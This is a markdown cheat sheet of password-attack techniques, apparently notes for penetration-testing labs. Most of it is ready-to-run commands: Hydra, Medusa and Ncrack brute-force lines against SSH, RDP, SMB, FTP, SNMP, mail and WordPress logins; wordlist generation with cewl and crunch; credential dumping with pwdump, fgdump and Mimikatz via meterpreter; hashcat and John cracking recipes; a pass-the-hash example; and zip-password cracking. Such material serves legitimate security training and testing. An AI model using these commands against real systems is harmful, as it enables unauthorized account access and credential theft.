# Password Attacks

- AES Decryption
    http://aesencryption.net/

- Convert multiple webpages into a word list
    ```bash
    for x in 'index' 'about' 'post' 'contact' ; do \
      curl http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >> webapp.txt ; \
    done
    ```

- Or convert html to word list dict
    `html2dic index.html.out | sort -u > index-html.dict`

- Default Usernames and Passwords

    - CIRT
        [*http://www.cirt.net/passwords*](http://www.cirt.net/passwords)

    - Government Security - Default Logins and Passwords for
        Networked Devices

    - [*http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php*](http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php)

    - Virus.org
        [*http://www.virus.org/default-password/*](http://www.virus.org/default-password/)

    - Default Password
        [*http://www.defaultpassword.com/*](http://www.defaultpassword.com/)

- Brute Force

    - Nmap Brute forcing Scripts
        [*https://nmap.org/nsedoc/categories/brute.html*](https://nmap.org/nsedoc/categories/brute.html)

    - Nmap Generic auto detect brute force attack:
        `nmap --script brute -Pn <target.com or ip>`

    - MySQL nmap brute force attack:
        `nmap --script=mysql-brute $ip`

- Dictionary Files

    - Word lists on Kali
        `cd /usr/share/wordlists`

- Key-space Brute Force

    - `crunch 6 6 0123456789ABCDEF -o crunch1.txt`

    - `crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha`

    - `crunch 8 8 -t ,@@^^%%%`

- Pwdump and Fgdump - Security Accounts Manager (SAM)

    - `pwdump.exe` - attempts to extract password hashes

    - `fgdump.exe` - attempts to kill local antiviruses before
        attempting to dump the password hashes and
        cached credentials.

- Windows Credential Editor (WCE)

    - allows one to perform several attacks to obtain clear text
        passwords and hashes. Usage: `wce -w`

- Mimikatz

    - extract plaintexts passwords, hash, PIN code and kerberos
        tickets from memory. mimikatz can also perform
        pass-the-hash, pass-the-ticket or build Golden tickets
        [*https://github.com/gentilkiwi/mimikatz*](https://github.com/gentilkiwi/mimikatz)
        From metasploit meterpreter (must have System level access):
        ```
        meterpreter> load mimikatz
        meterpreter> help mimikatz
        meterpreter> msv
        meterpreter> kerberos
        meterpreter> mimikatz_command -f samdump::hashes
        meterpreter> mimikatz_command -f sekurlsa::searchPasswords
        ```

- Password Profiling

    - cewl can generate a password list from a web page
        `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`

- Password Mutating

    - John the ripper can mutate password lists
        nano /etc/john/john.conf
        `john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt`

- Medusa

    - Medusa, initiated against an htaccess protected web
        directory
        `medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10`

- Ncrack

    - ncrack (from the makers of nmap) can brute force RDP
        `ncrack -vv --user offsec -P password-file.txt rdp://$ip`

- Hydra

    - Hydra brute force against SNMP

        `hydra -P password-file.txt -v $ip snmp`

    - Hydra FTP known user and rockyou password list

        `hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp`

    - Hydra SSH using list of users and passwords

        `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`

    - Hydra SSH using a known password and a username list

        `hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`

    - Hydra SSH Against Known username on port 22

        `hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt`

    - Hydra POP3 Brute Force

        `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`

    - Hydra SMTP Brute Force

        `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`

    - Hydra attack http get 401 login with a dictionary

        `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`

    - Hydra attack Windows Remote Desktop with rockyou

        `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`

    - Hydra brute force SMB user with rockyou:

        `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`

    - Hydra brute force a Wordpress admin login

        `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`


## Password Hash Attacks

  - Online Password Cracking
      [*https://crackstation.net/*](https://crackstation.net/)
      [*http://finder.insidepro.com/*](http://finder.insidepro.com/)

  - Hashcat
  Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the --force parameter.

    `apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev`

    and

    `apt-get install pocl-opencl-icd`

### Cracking Linux Hashes - /etc/shadow file

  ```
  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
  3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
  7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
  1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
  ```
###  Cracking Windows Hashes

  ```
  3000 | LM                                               | Operating-Systems
  1000 | NTLM                                             | Operating-Systems
  ```
### Cracking Common Application Hashes

  ```
    900 | MD4                                              | Raw Hash
      0 | MD5                                              | Raw Hash
    5100 | Half MD5                                         | Raw Hash
    100 | SHA1                                             | Raw Hash
  10800 | SHA-384                                          | Raw Hash
    1400 | SHA-256                                          | Raw Hash
    1700 | SHA-512                                          | Raw Hash
  ```

  Create a .hash file with all the hashes you want to crack
  puthasheshere.hash:
  `$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/`

  Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:

  `hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt`

  Wordpress sample hash: `$P$B55D6LjfHDkINU5wF.v2BuuzO0/XPk/`

  Wordpress clear text: `test`

###  Hashcat example cracking Wordpress passwords using rockyou:

    `hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt`

  - Sample Hashes
      [*http://openwall.info/wiki/john/sample-hashes*](http://openwall.info/wiki/john/sample-hashes)

  - Identify Hashes

      `hash-identifier`

  - To crack linux hashes you must first unshadow them:

      `unshadow passwd-file.txt shadow-file.txt`

      `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`

- John the Ripper - Password Hash Cracking

    - `john $ip.pwdump`

    - `john --wordlist=/usr/share/wordlists/rockyou.txt hashes`

    - `john --rules --wordlist=/usr/share/wordlists/rockyou.txt`

    - `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`

    - JTR forced descrypt cracking with wordlist

        `john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt`

    - JTR forced descrypt brute force cracking

        `john --format=descrypt hash --show`

- Passing the Hash in Windows

    - Use Metasploit to exploit one of the SMB servers in the labs.
        Dump the password hashes and attempt a pass-the-hash attack
        against another system:

        `export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 `

        `pth-winexe -U administrator //$ip cmd`

### Cracking zip file password

`fcrackzip -v -b -D -p rockyou.txt -u ./backup.zip`
